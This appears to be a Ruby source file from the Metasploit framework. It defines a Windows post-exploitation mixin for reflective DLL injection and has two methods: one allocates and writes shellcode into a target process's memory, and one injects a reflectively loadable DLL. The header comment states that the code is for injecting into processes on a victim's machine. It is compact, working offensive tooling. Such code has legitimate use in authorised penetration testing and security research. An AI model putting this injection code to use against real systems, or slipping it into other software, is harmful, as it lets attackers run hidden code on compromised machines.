# -*- coding: binary -*-

require 'msf/core/reflective_dll_loader'

###
#
# This module exposes functionality which makes it easier to do
# Reflective DLL Injection into processes on a victim's machine.
#
###

module Msf::Post::Windows::ReflectiveDLLInjection

  include Msf::ReflectiveDLLLoader

  PAGE_ALIGN = 1024

  #
  # Inject the given shellcode into a target process.
  #
  # @param process The process to inject the shellcode into.
  # @param shellcode The shellcode to inject.
  #
  # @return [Fixnum] Address of the shellcode in the target process's
  #                  memory.
  #
  def inject_into_process(process, shellcode)
    shellcode_size = shellcode.length

    unless shellcode.length % PAGE_ALIGN == 0
      shellcode_size += PAGE_ALIGN - (shellcode.length % PAGE_ALIGN)
    end

    shellcode_mem = process.memory.allocate(shellcode_size)
    process.memory.protect(shellcode_mem)
    process.memory.write(shellcode_mem, shellcode)

    return shellcode_mem
  end

  #
  # Inject a reflectively-injectable DLL into the given process
  # using reflective injection.
  #
  # @param process The process that will have the DLL injected into it.
  # @param dll_path Path to the DLL that is to be loaded and injected.
  #
  # @return [Array] Tuple of allocated memory address and offset to the
  #                 +ReflectiveLoader+ function.
  #
  def inject_dll_into_process(process, dll_path)
    dll, offset = load_rdi_dll(dll_path)
    dll_mem = inject_into_process(process, dll)

    return dll_mem, offset
  end

end
